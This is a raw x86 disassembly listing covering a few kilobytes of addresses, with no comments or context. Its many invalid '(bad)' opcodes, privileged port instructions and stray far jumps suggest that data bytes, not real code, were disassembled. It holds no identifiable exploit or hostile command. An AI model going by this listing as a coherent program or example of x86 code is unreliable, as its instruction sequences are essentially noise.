  41e462:	(bad)  
  41e463:	in     eax,0xce
  41e465:	adc    edi,edi
  41e467:	add    edx,ebp
  41e469:	mov    dl,0xd1
  41e46b:	aad    0xd0
  41e46d:	sti    
  41e46e:	int3   
  41e46f:	loopne 0x41e431
  41e471:	out    0xd1,al
  41e473:	test   ecx,0xfcd1cef8
  41e479:	add    edx,eax
  41e47b:	hlt    
  41e47c:	(bad)  
  41e47d:	mov    esp,0xfc3f6d2
  41e482:	aam    0x4
  41e484:	retf   
  41e485:	fcmovb st,st(4)
  41e487:	in     eax,0xf0
  41e489:	mov    cl,0xc7
  41e48b:	lods   eax,DWORD PTR ds:[esi]
  41e48c:	loope  0x41e482
  41e48e:	jmp    0x41e459
  41e490:	xlat   BYTE PTR ds:[ebx]
  41e491:	mov    edx,0xdccebbcb
  41e496:	retf   0xeeca
  41e499:	fcom   st(3)
  41e49b:	rcl    ch,cl
  41e49d:	shl    esi,0xc6
  41e4a0:	(bad)  
  41e4a1:	jecxz  0x41e47c
  41e4a3:	(bad)  
  41e4a5:	add    edi,ebp
  41e4a7:	loop   0x41e488
  41e4a9:	shl    BYTE PTR [edi-0x330c5039],cl
  41e4af:	loopne 0x41e48b
  41e4b1:	(bad)  
  41e4b2:	(bad)  
  41e4b4:	jmp    0xd2dc:0xfedfe3cc
  41e4bb:	xlat   BYTE PTR ds:[ebx]
  41e4bc:	rol    BYTE PTR [edi],0xdb
  41e4bf:	rcr    ebx,0xf8
  41e4c2:	loope  0x41e49a
  41e4c4:	out    0xce,eax
  41e4c6:	fisttp QWORD PTR [esp+ecx*8]
  41e4c9:	les    esi,FWORD PTR [ebx-0x3b2d3e23]
  41e4cf:	call   0xb708bc83
  41e4d4:	xlat   BYTE PTR ds:[ebx]
  41e4d5:	(bad)  
  41e4d6:	repnz (bad) 
  41e4d8:	inc    DWORD PTR [eax]
  41e4da:	std    
  41e4db:	fprem  
  41e4dd:	(bad)  
  41e4de:	(bad)  
  41e4e0:	sti    
  41e4e1:	ror    bh,0xdf
  41e4e4:	fucomp st(2)
  41e4e6:	fsubr  st(7),st
  41e4e8:	shl    esp,0xe5
  41e4eb:	shl    esi,1
  41e4ed:	mov    bh,0xca
  41e4ef:	call   0xda33dde1
  41e4f4:	aam    0xd6
  41e4f6:	aad    0xd6
  41e4f8:	mov    esp,0x7b8f2da
  41e4fd:	in     al,dx
  41e4fe:	out    0xdf,eax
  41e500:	fucom  st(7)
  41e502:	push   cs
  41e503:	or     eax,0xc4cedc0e
  41e508:	mov    bh,0xa9
  41e50b:	sar    BYTE PTR [ebp-0x39394450],0xda
  41e512:	mov    bh,0xc8
  41e514:	retf   0xd4ff
  41e517:	mov    edx,0xcc02d3fe
  41e51c:	loopne 0x41e51b
  41e51e:	rcr    bh,1
  41e520:	or     DWORD PTR [esi],eax
  41e522:	clc    
  41e523:	in     eax,dx
  41e524:	or     ecx,ecx
  41e526:	loope  0x41e539
  41e528:	in     eax,0xcf
  41e52a:	loopne 0x41e4d8
  41e52c:	aad    0xd1
  41e52e:	shl    ecx,0xf9
  41e531:	hlt    
  41e532:	shl    esp,cl
  41e534:	cld    
  41e535:	mov    ebp,0xf1defad9
  41e53a:	aad    0xc3
  41e53c:	mov    DWORD PTR [eax],0xc5dc0600
  41e542:	enter  0xcfc,0xdc
  41e546:	inc    BYTE PTR [ebx]
  41e548:	repz into 
  41e54a:	(bad)  
  41e54b:	loop   0x41e4fd
  41e54d:	loope  0x41e51c
  41e54f:	icebp  
  41e550:	mov    al,0xba
  41e552:	mov    cl,0xd8
  41e554:	sti    
  41e555:	repz mov cl,0xf5
  41e558:	into   
  41e559:	(bad)  
  41e55b:	mov    esp,0xff00df05
  41e560:	cld    
  41e561:	std    
  41e562:	in     al,0xef
  41e564:	out    dx,eax
  41e565:	add    esp,ebp
  41e567:	fcmove st,st(0)
  41e569:	mov    edi,0xd2d2e6c7
  41e56e:	loop   0x41e525
  41e570:	mov    ah,0xcb
  41e572:	enter  0xf1fb,0xd2
  41e576:	retf   
  41e577:	loope  0x41e57b
  41e579:	(bad)  
  41e57a:	mov    esp,0xd504e5cd
  41e57f:	xlat   BYTE PTR ds:[ebx]
  41e580:	cli    
  41e581:	cld    
  41e582:	jecxz  0x41e580
  41e584:	cmc    
  41e585:	loop   0x41e548
  41e587:	jecxz  0x41e56b
  41e589:	mov    bl,0xe0
  41e58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e58c:	(bad)  
  41e58d:	cmc    
  41e58e:	lock lods al,BYTE PTR ds:[esi]
  41e590:	mov    dl,0xb6
  41e592:	fcom   st(5)
  41e594:	cld    
  41e595:	xlat   BYTE PTR ds:[ebx]
  41e596:	mov    ch,0xdb
  41e598:	mov    ebp,0x7f0b5ee
  41e59d:	lock push es
  41e59f:	or     edx,ebx
  41e5a1:	leave  
  41e5a2:	jmp    0xe1c8:0xe7cff5ca
  41e5a9:	ror    ch,0xeb
  41e5ac:	in     eax,dx
  41e5ad:	vpaddsw ymm2,ymm5,ymm7
  41e5b1:	mov    bh,0xea
  41e5b3:	mov    edx,0x2d4e9f7
  41e5b8:	ret    0xd1ee
  41e5bb:	mov    esi,0x2e005d5
  41e5c0:	clc    
  41e5c1:	out    dx,eax
  41e5c2:	loope  0x41e5a9
  41e5c4:	add    BYTE PTR [ecx],cl
  41e5c6:	or     eax,0xe5cfecf3
  41e5cb:	mov    dh,0xef
  41e5cd:	div    esp
  41e5cf:	test   al,0xf4
  41e5d1:	enter  0xeead,0xea
  41e5d5:	sti    
  41e5d6:	stc    
  41e5d7:	repnz (bad) 
  41e5da:	mov    ebp,0xf2fabedb
  41e5df:	aam    0xfb
  41e5e1:	fst    st(6)
  41e5e3:	in     eax,dx
  41e5e4:	add    al,0xe6
  41e5e6:	enter  0xa8eb,0xf0
  41e5ea:	jmp    0x41e5cc
  41e5ec:	out    0xea,al
  41e5ee:	loope  0x41e598
  41e5f0:	mov    dl,0xe4
  41e5f2:	push   DWORD PTR [eax-0x20f4d16]
  41e5f8:	loopne 0x41e5cc
  41e5fa:	jmp    edi
  41e5fc:	(bad)  
  41e5fd:	in     al,0xd8
  41e5ff:	rcl    ch,0xe7
  41e602:	pxor   mm4,mm7
  41e605:	pop    es
  41e606:	pop    es
  41e607:	add    ebp,eax
  41e609:	in     eax,0xbc
  41e60b:	loopne 0x41e5d6
  41e60d:	lods   eax,DWORD PTR ds:[esi]
  41e60e:	shl    esp,0xc7
  41e611:	call   ebx
  41e613:	mov    esi,0xc3fed0fe
  41e618:	cmc    
  41e619:	repnz (bad) 
  41e61b:	mov    ah,0xfb
  41e61d:	neg    cl
  41e61f:	mov    BYTE PTR [edi],0xc0
  41e622:	(bad)  
  41e623:	fisttp QWORD PTR [ebx]
  41e625:	leave  
  41e626:	or     eax,0xb3c2dee0
  41e62b:	enter  0xf2e3,0xfb
  41e62f:	cmc    
  41e630:	in     eax,0xee
  41e632:	xlat   BYTE PTR ds:[ebx]
  41e633:	mov    ecx,0xf0dfe4de
  41e638:	fcmovnu st,st(4)
  41e63a:	pop    es
  41e63b:	out    dx,al
  41e63c:	(bad)  
  41e63d:	stc    
  41e63e:	out    0xfa,al
  41e640:	(bad)
  41e643:	sti    
  41e644:	iret   
  41e645:	push   es
  41e646:	loop   0x41e63a
  41e648:	lds    edi,FWORD PTR [eax-0x292f0f0a]
  41e64e:	jecxz  0x41e614
  41e650:	fdiv   st,st(1)
  41e652:	into   
  41e653:	rcr    ah,cl
  41e655:	lock fdivr QWORD PTR [esp+edi*8-0x2cff0d21]
  41e65d:	clc    
  41e65e:	rol    edx,1
  41e660:	loop   0x41e64c
  41e662:	jecxz  0x41e628
  41e664:	cmc    
  41e665:	add    ebx,esp
  41e667:	fcomp  st(5)
  41e669:	fdivr  QWORD PTR [edi+eax*8-0x352e2c0e]
  41e670:	mov    dh,0xe4
  41e672:	out    0xd7,eax
  41e674:	rcl    cl,cl
  41e676:	jmp    0xff1fa23d
  41e67b:	out    dx,al
  41e67c:	out    0xf2,eax
  41e67e:	icebp  
  41e67f:	cld    
  41e680:	aam    0xd7
  41e682:	stc    
  41e683:	push   cs
  41e684:	pop    es
  41e685:	pop    es
  41e686:	push   cs
  41e687:	fdivr  QWORD PTR [ecx-0x12511253]
  41e68d:	rep lods al,BYTE PTR ds:[esi]
  41e68f:	(bad)  
  41e690:	in     al,0xe4
  41e692:	(bad)  
  41e693:	div    BYTE PTR [esi-0xf1c2145]
  41e699:	int    0xe7
  41e69b:	loop   0x41e682
  41e69d:	in     al,dx
  41e69e:	in     al,0xf5
  41e6a0:	ret    
  41e6a1:	add    eax,0xfdc4d4d6
  41e6a6:	out    0xe5,al
  41e6a8:	mov    dl,0xb0
  41e6aa:	rcl    ebp,0xdc
  41e6ad:	mov    ah,0xd5
  41e6af:	repnz (bad) 
  41e6b1:	fcmovnbe st,st(5)
  41e6b3:	shl    DWORD PTR [ebx-0x3d314a1d],cl
  41e6b9:	sar    ch,cl
  41e6bb:	fcomp  st(7)
  41e6bd:	mov    ebp,0xdde1d6fc
  41e6c2:	out    0xd8,eax
  41e6c4:	clc    
  41e6c5:	ret    0xf1cd
  41e6c8:	rcr    dh,1
  41e6ca:	iret   
  41e6cb:	xlat   BYTE PTR ds:[ebx]
  41e6cc:	cmc    
  41e6cd:	jecxz  0x41e6b7
  41e6cf:	lock out 0xec,eax
  41e6d2:	(bad)  
  41e6d3:	sar    DWORD PTR [esi-0x9273516],1
  41e6d9:	repz repz rol cl,cl
  41e6dd:	add    al,BYTE PTR [ecx]
  41e6df:	fiadd  DWORD PTR [ecx]
  41e6e1:	dec    cl
  41e6e3:	loope  0x41e6ee
  41e6e5:	(bad)
  41e6e8:	test   al,0xcd
  41e6ea:	shl    DWORD PTR [ebx-0x1a0d0a40],cl
  41e6f0:	in     eax,0xc5
  41e6f2:	jmp    0xb1fcd9e8
  41e6f7:	leave  
  41e6f8:	in     al,dx
  41e6f9:	fild   DWORD PTR [esi]
  41e6fb:	(bad)  
  41e6fd:	add    eax,0xd807c3eb
  41e702:	out    0xf6,al
  41e704:	in     eax,dx
  41e705:	stc    
  41e706:	jecxz  0x41e6e8
  41e708:	shl    ecx,cl
  41e70a:	jmp    0x41e6f8
  41e70c:	cmc    
  41e70d:	ror    esi,cl
  41e70f:	loop   0x41e6e6
  41e711:	rcl    dh,cl
  41e713:	out    0xc8,al
  41e715:	in     al,dx
  41e716:	retf   0xf2dc
  41e719:	repz hlt 
  41e71b:	rcr    bl,1
  41e71d:	xlat   BYTE PTR ds:[ebx]
  41e71e:	not    bh
  41e720:	(bad)  
  41e721:	loope  0x41e719
  41e723:	std    
  41e724:	fmul   st(3),st
  41e726:	push   cs
  41e727:	add    bh,BYTE PTR [esi+eiz*8-0x431180f]
  41e72e:	mul    dl
  41e730:	aad    0xd4
  41e732:	(bad)  
  41e733:	mov    ecx,0xd7ebcced
  41e738:	sar    BYTE PTR [eax-0xb3e2a2a],1
  41e73e:	add    eax,0xdcefe2d4
  41e743:	pmaddwd mm1,QWORD PTR [edx+ecx*8]
  41e747:	loop   0x41e72c
  41e749:	mov    esp,0xf0e1f3eb
  41e74e:	out    0xe9,al
  41e750:	out    dx,al
  41e751:	mov    ah,0xc6
  41e753:	lods   al,BYTE PTR ds:[esi]
  41e754:	repnz add edx,ecx
  41e757:	loop   0x41e715
  41e759:	aad    0x6
  41e75b:	out    0x1,al
  41e75d:	in     al,0xd6
  41e75f:	ret    0xe4c9
  41e762:	cmc    
  41e763:	in     al,0xe3
  41e765:	or     al,bh
  41e767:	out    0xe3,al
  41e769:	int    0xb7
  41e76b:	ret    0xf7f1
  41e76e:	out    0xdb,al
  41e770:	mov    ecx,0xfddbe7e4
  41e775:	mov    ah,0xf9
  41e777:	std    
  41e778:	mov    esi,0xcc07dfdc
  41e77d:	out    0xe1,eax
  41e77f:	in     al,0x1
  41e781:	or     eax,edi
  41e783:	std    
  41e784:	out    0xee,al
  41e786:	leave  
  41e787:	call   0xce38df34
  41e78c:	call   0xcef9c348
  41e791:	ffreep st(6)
  41e793:	into   
  41e794:	(bad)  
  41e795:	in     al,dx
  41e796:	int3   
  41e797:	loope  0x41e76b
  41e799:	out    dx,eax
  41e79a:	sti    
  41e79b:	repz pop es
  41e79d:	sti    
  41e79e:	(bad)  
  41e79f:	(bad)  
  41e7a0:	add    ebx,edi
  41e7a2:	aad    0xef
  41e7a4:	pminub mm3,mm7
  41e7a7:	push   es
  41e7a8:	mov    edi,0xc6f3e6ee
  41e7ad:	repnz int3 
  41e7af:	int    0xb9
  41e7b1:	in     eax,0xb9
  41e7b3:	fidivr DWORD PTR [edi-0x2c0ffc46]
  41e7b9:	int    0xd3
  41e7bb:	std    
  41e7bc:	add    esi,edx
  41e7be:	mov    ebp,0xe5df0b0b
  41e7c3:	in     eax,dx
  41e7c4:	(bad)  
  41e7c6:	jecxz  0x41e7aa
  41e7c8:	scas   eax,DWORD PTR es:[edi]
  41e7c9:	mov    dl,0xcb
  41e7cb:	fdiv   QWORD PTR [ebx-0x15442a11]
  41e7d1:	jmp    0xd5f4:0xbfbbffeb
  41e7d8:	icebp  
  41e7d9:	cld    
  41e7da:	iret   
  41e7db:	jecxz  0x41e7d4
  41e7dd:	sar    dh,cl
  41e7df:	hlt    
  41e7e0:	add    DWORD PTR [edi],ecx
  41e7e2:	retf   
  41e7e3:	add    al,0xd9
  41e7e5:	out    dx,eax
  41e7e6:	add    al,0x5
  41e7e8:	ret    
  41e7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7ea:	repz ret 
  41e7ec:	bnd ret 
  41e7ee:	jmp    0x41e7c3
  41e7f0:	mul    esp
  41e7f2:	(bad)  
  41e7f3:	into   
  41e7f4:	div    dl
  41e7f6:	dec    esp
  41e7f8:	icebp  
  41e7f9:	repnz test ecx,0xf20b03cd
  41e800:	sti    
  41e801:	loop   0x41e800
  41e803:	dec    ebx
  41e805:	jmp    0xf02df514
  41e80a:	out    dx,al
  41e80b:	mov    bh,0xad
  41e80d:	mov    ah,0xe4
  41e80f:	mov    al,0xfb
  41e811:	mov    bh,0xef
  41e813:	std    
  41e814:	(bad)  
  41e815:	mov    ebp,0xdcf4f9b9
  41e81a:	fcmovbe st,st(3)
  41e81c:	in     al,dx
  41e81d:	loope  0x41e7f8
  41e81f:	or     ecx,edx
  41e821:	cmc    
  41e822:	rcr    ah,0xe5
  41e825:	cld    
  41e826:	int    0xa
  41e828:	test   eax,0xc2c5afc2
  41e82d:	mov    ch,0xc1
  41e82f:	int    0xd5
  41e831:	out    0xff,eax
  41e833:	imul   ebp
  41e835:	add    ebp,ebp
  41e837:	mov    ebp,0xe2ccf4d6
  41e83c:	repz sar DWORD PTR [ecx-0x3037391b],0x3
  41e844:	les    eax,FWORD PTR [eax]
  41e846:	pminub mm5,mm7
  41e849:	jmp    0x41e7fb
  41e84b:	lods   al,BYTE PTR ds:[esi]
  41e84c:	stos   DWORD PTR es:[edi],eax
  41e84d:	hlt    
  41e84e:	hlt    
  41e84f:	retf   0xd5f8
  41e852:	mov    ebx,0xc9bff3fe
  41e857:	(bad)  
  41e859:	ffree  st(0)
  41e85b:	dec    ebp
  41e85d:	icebp  
  41e85e:	hlt    
  41e85f:	shl    dh,cl
  41e861:	rcl    dh,0xd9
  41e864:	vpsrad ymm4,ymm6,xmm4
  41e868:	fidiv  WORD PTR [eax-0x1a311a1a]
  41e86e:	(bad)
  41e871:	repz mov ch,0xf4
  41e874:	repnz not esi
  41e877:	in     eax,dx
  41e878:	mov    edi,0xbdecdcbd
  41e87d:	in     al,0xd4
  41e87f:	sar    ch,cl
  41e881:	std    
  41e882:	(bad)  
  41e885:	stc    
  41e886:	ror    DWORD PTR [ecx],cl
  41e888:	mov    edi,0xefcfbebc
  41e88d:	(bad)
  41e890:	rcr    al,0xfe
  41e893:	(bad)  
  41e894:	call   0xddfda763
  41e899:	clc    
  41e89a:	cli    
  41e89b:	pop    es
  41e89c:	loop   0x41e88a
  41e89e:	(bad)  
  41e8a0:	loope  0x41e8a6
  41e8a2:	rol    DWORD PTR [edx+ecx*8],0xdd
  41e8a6:	loope  0x41e8b5
  41e8a8:	fmul   st,st(2)
  41e8aa:	sar    BYTE PTR [ebp-0x36085550],cl
  41e8b0:	shr    al,0xb6
  41e8b3:	in     al,0xd3
  41e8b5:	iret   
  41e8b6:	loop   0x41e881
  41e8b8:	out    dx,eax
  41e8b9:	mov    edi,0x7bdddf2
  41e8be:	cli    
  41e8bf:	push   es
  41e8c0:	add    al,bh
  41e8c2:	clc    
  41e8c3:	loopne 0x41e8a2
  41e8c5:	call   0xc2fef5a3
  41e8ca:	idiv   BYTE PTR [ebp+edi*4-0x1a301329]
  41e8d1:	push   DWORD PTR [ebp-0x260b480c]
  41e8d7:	repnz aam 0xf5
  41e8da:	cmc    
  41e8db:	in     al,dx
  41e8dc:	add    BYTE PTR ds:0x1e60adc,al
  41e8e2:	paddw  mm4,mm5
  41e8e5:	fucomi st,st(2)
  41e8e7:	pop    es
  41e8e8:	ret    
  41e8e9:	lods   al,BYTE PTR ds:[esi]
  41e8ea:	out    0xf1,al
  41e8ec:	jmp    0xef07bfa1
  41e8f1:	mul    ch
  41e8f3:	enter  0xcdfd,0xbb
  41e8f7:	jmp    0xdf01bdfa
  41e8fc:	(bad)  
  41e8fe:	fnstsw WORD PTR [esp+edx*8-0x202bf01d]
  41e905:	add    cl,BYTE PTR [eax]
  41e907:	(bad)  
  41e908:	mov    dl,0xc5
  41e90a:	out    0xcb,al
  41e90c:	ret    
  41e90d:	call   0xe70f9bc6
  41e912:	int3   
  41e913:	int    0xe9
  41e915:	int    0xd2
  41e917:	bnd call edx
  41e91a:	clc    
  41e91b:	fdiv   st(5),st
  41e91d:	add    ecx,DWORD PTR [ebx]
  41e91f:	jecxz  0x41e903
  41e921:	push   es
  41e922:	fiadd  WORD PTR [esi+eax*8]
  41e925:	add    ebx,edi
  41e927:	add    ch,dh
  41e929:	call   0xe218ced7
  41e92e:	shl    edx,cl
  41e930:	clc    
  41e931:	stc    
  41e932:	xlat   BYTE PTR ds:[ebx]
  41e933:	shl    al,cl
  41e935:	jmp    0xf0d6:0xc1e3fdcc
  41e93c:	mov    edi,0xf8f9ff
  41e941:	loope  0x41e90d
  41e943:	(bad)  
  41e944:	in     eax,0xfc
  41e946:	repnz or eax,eax
  41e949:	mov    esp,0xd2eaaebd
  41e94e:	fcmovu st,st(3)
  41e950:	retf   0xe7b8
  41e953:	jmp    0x41e920
  41e955:	idiv   DWORD PTR [edx-0x4472d14]
  41e95b:	fadd   st(7),st
  41e95d:	fcmovbe st,st(6)
  41e95f:	add    esp,eax
  41e961:	loop   0x41e95e
  41e963:	or     bh,ah
  41e965:	(bad)
  41e968:	lock mov edi,0xdcf3e8c4
  41e96e:	jmp    0x41e920
  41e970:	call   0xc02ce16b
  41e975:	sar    BYTE PTR [edi-0x2f0d4641],cl
  41e97b:	in     eax,0xc0
  41e97d:	rol    BYTE PTR [ecx],0xf5
  41e980:	or     cl,ah
  41e982:	fiadd  DWORD PTR [edx]
  41e984:	in     eax,dx
  41e985:	or     DWORD PTR [ebx],ecx
  41e987:	add    edi,ebx
  41e989:	in     eax,0xed
  41e98b:	cmc    
  41e98c:	(bad)  
  41e98d:	shr    dl,1
  41e98f:	cli    
  41e990:	out    0xd5,al
  41e992:	ror    esp,1
  41e994:	icebp  
  41e995:	sti    
  41e996:	rol    DWORD PTR [ebx],1
  41e998:	add    esp,edx
  41e99a:	std    
  41e99b:	sti    
  41e99c:	sar    bl,1
  41e99e:	fcmovnu st,st(4)
  41e9a0:	aad    0xdd
  41e9a2:	shr    edi,0xce
  41e9a5:	add    ch,al
  41e9a7:	adc    bh,BYTE PTR [ecx-0x4e1a3a3c]
  41e9ad:	rcr    ebx,0xf0
  41e9b0:	into   
  41e9b1:	out    dx,al
  41e9b2:	sti    
  41e9b3:	(bad)  
  41e9b4:	rcl    dh,cl
  41e9b6:	test   DWORD PTR [edx],0xfad5f7fc
  41e9bc:	fcom   st(0)
  41e9be:	stc    
  41e9bf:	(bad)  
  41e9c0:	test   edi,0xd4ede5f9
  41e9c6:	add    ebp,esi
  41e9c8:	scas   al,BYTE PTR es:[edi]
  41e9c9:	fisubr WORD PTR [ebp-0x853541c]
  41e9cf:	rcl    edx,cl
  41e9d1:	jmp    0x41e9c5
  41e9d3:	mov    eax,0xeccdf9f6
  41e9d8:	mov    esp,0xfaf5dcfa
  41e9dd:	out    0x0,al
  41e9df:	aam    0xe5
  41e9e1:	jmp    0xfc48eedc
  41e9e6:	or     eax,0xf7afc9f9
  41e9eb:	out    0xcf,al
  41e9ed:	out    dx,eax
  41e9ee:	xlat   BYTE PTR ds:[ebx]
  41e9ef:	in     al,dx
  41e9f0:	jmp    0xddc8:0xfdd6e4eb
  41e9f7:	(bad)  
  41e9f9:	shr    ch,cl
  41e9fb:	push   es
  41e9fc:	cmc    
  41e9fd:	fiadd  WORD PTR [esi]
  41e9ff:	(bad)  
  41ea00:	ffree  st(5)
  41ea02:	jmp    0x42db415
  41ea07:	adc    edi,ecx
  41ea09:	jecxz  0x41e9f8
  41ea0b:	jmp    0xd02fd0c5
  41ea10:	fnstenv [esi-0x1c360a02]
  41ea16:	fcmovnbe st,st(5)
  41ea18:	add    eax,edi
  41ea1a:	cld    
  41ea1b:	mov    esi,0xfef7c7bd
  41ea20:	idiv   edi
  41ea22:	fdivrp st(6),st
  41ea24:	(bad)  
  41ea25:	cld    
  41ea26:	push   es
  41ea27:	add    eax,0xc8c9b3eb
  41ea2c:	int3   
  41ea2d:	ror    eax,1
  41ea2f:	jmp    0x41ea19
  41ea31:	jmp    0xffde:0xb6d4fead
  41ea38:	fild   DWORD PTR [ecx]
  41ea3a:	add    al,BYTE PTR ds:0xd70bd9ed
  41ea40:	std    
  41ea41:	add    dh,ch
  41ea43:	in     eax,dx
  41ea44:	or     esi,edi
  41ea46:	fucomi st,st(4)
  41ea48:	ret    0xd3ee
  41ea4b:	retf   
  41ea4c:	jmp    0xcced:0xafd2dbc0
  41ea53:	sti    
  41ea54:	jmp    0xcf3da341
  41ea59:	int    0xfd
  41ea5b:	std    
  41ea5c:	pop    es
  41ea5d:	repz sti 
  41ea5f:	fcomp  st(2)
  41ea61:	hlt    
  41ea62:	clc    
  41ea63:	leave  
  41ea64:	syscall 
  41ea66:	or     eax,0xe3f7c0e4
  41ea6b:	fsubrp st(5),st
  41ea6d:	into   
  41ea6e:	loopne 0x41ea67
  41ea70:	out    0xc0,al
  41ea72:	leave  
  41ea73:	(bad)
  41ea76:	jmp    0x41ea48
  41ea78:	mov    bh,0x1
  41ea7a:	add    ah,cl
  41ea7c:	mul    ebp
  41ea7e:	mul    esp
  41ea80:	fxtract 
  41ea82:	sti    
  41ea83:	(bad)  
  41ea84:	jmp    0x41ea4b
  41ea86:	or     edi,ecx
  41ea88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea89:	mov    eax,0xe2f3e9e7
  41ea8e:	mov    ebx,0xede7efe6
  41ea93:	jmp    0xe013e294
  41ea98:	shl    bl,1
  41ea9a:	mov    esp,0xd3e604d6
  41ea9f:	ret    0xf500
  41eaa2:	retf   
  41eaa3:	push   cs
  41eaa4:	(bad)  
  41eaa5:	(bad)  
  41eaa7:	or     al,0xb3
  41eaa9:	in     al,0xb7
  41eaab:	test   esi,0xf1ebc0cf
  41eab1:	shr    ebx,1
  41eab3:	mov    ecx,0xdfd5fcd7
  41eab8:	aad    0x7
  41eaba:	out    0xfd,eax
  41eabc:	aam    0x6
  41eabe:	ret    
  41eabf:	fld    QWORD PTR [eax]
  41eac1:	add    esp,edi
  41eac3:	inc    BYTE PTR [ecx]
  41eac5:	fld    DWORD PTR [edi]
  41eac7:	jmp    0xc815dcb9
  41eacc:	cmc    
  41eacd:	enter  0xe5c9,0xc1
  41ead1:	(bad)  
  41ead2:	int3   
  41ead3:	jmp    0xcdf1:0xf9d0d7da
  41eada:	fdivrp st(6),st
  41eadc:	repnz cld 
  41eade:	or     esi,esp
  41eae0:	hlt    
  41eae1:	stc    
  41eae2:	(bad)  
  41eae3:	or     DWORD PTR [esi],ecx
  41eae5:	retf   0xe4f2
  41eae8:	rol    bl,1
  41eaea:	(bad)  
  41eaeb:	(bad)  
  41eaec:	mov    bl,0xc5
  41eaee:	call   0xb8fbe1bf
  41eaf3:	icebp  
  41eaf4:	int3   
  41eaf5:	shl    DWORD PTR [edi+edi*4-0x4b0f3d00],cl
  41eafc:	rol    BYTE PTR [esi],1
  41eafe:	fdivr  st,st(5)
  41eb00:	add    eax,DWORD PTR [ebx+ebp*8]
  41eb03:	hlt    
  41eb04:	jecxz  0x41eaff
  41eb06:	fucomip st,st(5)
  41eb08:	jmp    0xb0c3:0xcfacdfb3
  41eb0f:	mov    bh,0xe7
  41eb11:	into   
  41eb12:	inc    dh
  41eb14:	(bad)  
  41eb16:	jecxz  0x41eb07
  41eb18:	mov    edi,0xdded00f3
  41eb1d:	fcmovbe st,st(3)
  41eb1f:	add    edx,esi
  41eb21:	(bad)
  41eb24:	jmp    0x41eb0d
  41eb26:	jmp    0xb430ab2c
  41eb2b:	mov    bh,0xd6
  41eb2d:	aam    0xe4
  41eb2f:	mov    cl,0xd2
  41eb31:	out    dx,eax
  41eb32:	into   
  41eb33:	idiv   DWORD PTR [edx-0x290b2e21]
  41eb39:	loope  0x41eb02
  41eb3b:	loopne 0x41eafd
  41eb3d:	(bad)  
  41eb3e:	mov    ecx,0xf6eb09d2
  41eb43:	push   cs
  41eb44:	retf   
  41eb45:	retf   
  41eb46:	into   
  41eb47:	fst    st(3)
  41eb49:	leave  
  41eb4a:	jmp    0x41eafd
  41eb4c:	rcl    ebp,1
  41eb4e:	aad    0xc8
  41eb50:	(bad)  
  41eb51:	out    0xf1,eax
  41eb53:	(bad)  
  41eb54:	ror    edx,1
  41eb56:	std    
  41eb57:	mov    esp,0xd506e0ed
  41eb5c:	mov    ebx,0x5c4ffd7
  41eb61:	add    edi,ebp
  41eb63:	in     al,0xfa
  41eb65:	push   es
  41eb66:	repz repz mov ebp,0xc7cacfbf
  41eb6d:	mov    dl,0xc7
  41eb6f:	call   0xbf16c048
  41eb74:	in     al,dx
  41eb75:	fdiv   QWORD PTR [ecx-0x33022629]
  41eb7b:	clc    
  41eb7c:	out    0xc0,al
  41eb7e:	mov    ebp,0xf6f7f7f6
  41eb83:	(bad)  
  41eb85:	or     cl,BYTE PTR [ebx]
  41eb87:	std    
  41eb88:	leave  
  41eb89:	retf   
  41eb8a:	into   
  41eb8b:	retf   0xc6b1
  41eb8e:	mov    bh,0xf4
  41eb90:	mov    bh,0xe9
  41eb92:	(bad)  
  41eb93:	repz repz mov edi,0xf5e2ead9
  41eb9a:	loop   0x41eb74
  41eb9c:	mov    edi,0xc7b8dfd3
  41eba1:	add    al,0xdf
  41eba3:	retf   
  41eba4:	jmp    0xd055b58a
  41eba9:	mov    edi,0xb1b7c2f2
  41ebae:	aad    0xc6
  41ebb0:	in     eax,0xd0
  41ebb2:	mov    edx,0xccbfeff9
  41ebb7:	fsubrp st(3),st
  41ebb9:	loope  0x41ebb1
  41ebbb:	add    esp,esp
  41ebbd:	(bad)  
  41ebbe:	aad    0xc6
  41ebc0:	rol    BYTE PTR [ebx],0xcf
  41ebc3:	clc    
  41ebc4:	ret    
  41ebc5:	adc    edi,edx
  41ebc7:	enter  0xc0a8,0xf0
  41ebcb:	lock mov ch,0xd1
  41ebce:	int    0xb3
  41ebd0:	enter  0xf0fa,0xac
  41ebd4:	int    0xf8
  41ebd6:	fld    DWORD PTR [ebx]
  41ebd8:	add    dl,bl
  41ebda:	jecxz  0x41ebd0
  41ebdc:	idiv   DWORD PTR [edx-0x20340901]
  41ebe2:	add    eax,0x9dbdc04
  41ebe7:	or     ebx,edx
  41ebe9:	stos   BYTE PTR es:[edi],al
  41ebea:	jecxz  0x41eb9b
  41ebec:	ret    0xc1fb
  41ebef:	out    0xfa,al
  41ebf1:	scas   al,BYTE PTR es:[edi]
  41ebf2:	mov    ecx,0xe2dbf0ca
  41ebf7:	lock (bad) 
  41ebfa:	sar    ebx,cl
  41ebfc:	ret    0xd4c3
  41ebff:	add    esp,ebx
  41ec01:	in     al,0xea
  41ec03:	out    dx,al
  41ec04:	paddsw mm1,QWORD PTR [esi]
  41ec07:	ffree  st(2)
  41ec09:	enter  0xcedd,0xc6
  41ec0d:	aam    0xdb
  41ec0f:	mov    dl,0xd4
  41ec11:	(bad)  
  41ec13:	mov    al,0xb7
  41ec15:	iret   
  41ec16:	fnclex 
  41ec18:	stc    
  41ec19:	add    edx,esp
  41ec1b:	(bad)  
  41ec1d:	shl    ah,0xe6
  41ec20:	call   0xdb2bc915
  41ec25:	fist   WORD PTR [ebx]
  41ec27:	or     edi,ebp
  41ec29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec2a:	in     eax,0xe4
  41ec2c:	shl    ch,1
  41ec2e:	rol    ah,1
  41ec30:	jmp    0x41ebf9
  41ec32:	icebp  
  41ec33:	in     eax,0xef
  41ec35:	sar    DWORD PTR [edx+edi*8-0x9381c34],1
  41ec3c:	mov    ebx,0x5f903e4
  41ec42:	or     DWORD PTR [esi],eax
  41ec44:	std    
  41ec45:	call   0xd7f2f52b
  41ec4a:	in     al,dx
  41ec4b:	imul   dh
  41ec4d:	test   al,0xb7
  41ec50:	retf   0xcfec
  41ec53:	jmp    0x41ec14
  41ec55:	fmulp  st(0),st
  41ec57:	mov    ecx,0x3d3d9d4
  41ec5c:	icebp  
  41ec5d:	out    0xe2,eax
  41ec5f:	call   eax
  41ec61:	cld    
  41ec62:	cmc    
  41ec63:	or     ch,al
